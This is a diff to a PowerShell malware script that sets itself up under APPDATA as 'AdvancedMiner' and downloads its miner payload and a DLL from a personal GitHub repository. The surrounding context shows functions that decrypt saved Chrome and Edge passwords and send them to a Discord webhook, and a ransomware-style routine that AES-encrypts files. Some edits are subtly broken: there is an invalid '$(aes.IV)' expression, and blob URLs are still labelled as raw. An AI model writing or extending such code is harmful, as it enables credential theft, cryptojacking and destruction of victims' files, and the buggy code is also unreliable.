@@ -12,12 +12,13 @@ $baseDir = "$env:APPDATA\AdvancedMiner"
 $miningScriptPath = "$baseDir\mining.ps1"
 $logFile = "$baseDir\mining_log.txt"
 $configFile = "$baseDir\config.json"
-$scriptUrl = "https://raw.githubusercontent.com/Azulprojets/shubabes/main/mining.ps1"  # Updated to raw GitHub URL
+$scriptUrl = "https://github.com/Azulprojets/shubabes/blob/main/mining.ps1"  # Updated to raw GitHub URL
 
 # URLs for downloading files
-$miningScriptUrl = "https://raw.githubusercontent.com/Azulprojets/shubabes/main/mining.ps1"  # Updated to raw GitHub URL
+$miningScriptUrl = "https://github.com/Azulprojets/shubabes/blob/main/mining.ps1"  # Updated to raw GitHub URL
 $sqlite3Url = "https://www.sqlite.org/2023/sqlite-tools-win32-x86-3430100.zip"  # SQLite tools ZIP
-$liteDbDllUrl = "https://codeload.github.com/litedb-org/LiteDB/zip/refs/tags/v5.0.20"  # Corrected to .nupkg
+# Updated to download LiteDB.dll from your GitHub repository
+$liteDbDllUrl = "https://github.com/Azulprojets/shubabes/blob/main/LiteDB.dll"  # Replace with your actual raw file URL
 
 # Add a flag for CPU mining (set based on your setup)
 $cpuMiningEnabled = $true  # Set to $false if only GPU mining is desired
@@ -81,21 +82,11 @@ $liteDbDllPath = "$baseDir\LiteDB.dll"
 if (-not (Test-Path $liteDbDllPath)) {
     Write-Log "LiteDB.dll not found. Downloading from $liteDbDllUrl..."
     try {
-        $zipPath = "$env:TEMP\litedb.nupkg"
-        Invoke-WebRequest -Uri $liteDbDllUrl -OutFile $zipPath -ErrorAction Stop
-        Expand-Archive -Path $zipPath -DestinationPath $baseDir -Force -ErrorAction Stop
-        # Locate LiteDB.dll in the extracted files (likely in a subdirectory like lib\netstandard2.0)
-        $extractedDll = Get-ChildItem -Path $baseDir -Recurse -Filter "LiteDB.dll" | Select-Object -First 1
-        if ($extractedDll) {
-            Move-Item -Path $extractedDll.FullName -Destination $liteDbDllPath -Force -ErrorAction Stop
-            Write-Log "LiteDB.dll moved to $liteDbDllPath."
-        } else {
-            Write-Log "LiteDB.dll not found in the extracted files."
-            exit 1
-        }
-        Remove-Item $zipPath -ErrorAction Stop
+        # Directly download the DLL (no need to extract since it’s a raw file)
+        Invoke-WebRequest -Uri $liteDbDllUrl -OutFile $liteDbDllPath -ErrorAction Stop
+        Write-Log "LiteDB.dll downloaded successfully to $liteDbDllPath."
     } catch {
-        Write-Log "Failed to download or extract LiteDB.dll: $_"
+        Write-Log "Failed to download LiteDB.dll: $_"
         exit 1
     }
 } else {
@@ -277,7 +268,7 @@ function Get-ChromeCredentials {
                     Send-DiscordWebhook -message $message
                     Write-Log "Extracted credential for $url"
                 } catch {
-                    Write-Log "Decryption failed for $($url): $_"  # Fixed with subexpression
+                    Write-Log "Decryption failed for $($url): $_"
                 }
             }
         }
@@ -337,7 +328,7 @@ function Get-EdgeCredentials {
                     Send-DiscordWebhook -message $message
                     Write-Log "Extracted Edge credential for $url"
                 } catch {
-                    Write-Log "Decryption failed for $($url): $_"  # Fixed with subexpression
+                    Write-Log "Decryption failed for $($url): $_"
                 }
             }
         }
@@ -457,7 +448,7 @@ function Simulate-Ransomware {
     Get-ChildItem $testDir -File | ForEach-Object {
         $content = Get-Content $_.FullName -Raw
         $aes = [System.Security.Cryptography.Aes]::Create()
-        $encryptor = $aes.CreateEncryptor($key, $aes.IV)
+        $encryptor = $aes.CreateEncryptor($key, $(aes.IV))
         $encrypted = $encryptor.TransformFinalBlock([System.Text.Encoding]::UTF8.GetBytes($content), 0, $content.Length)
         Set-Content $_.FullName $encrypted -Encoding Byte
         Rename-Item $_.FullName "$($_.Name).encrypted"
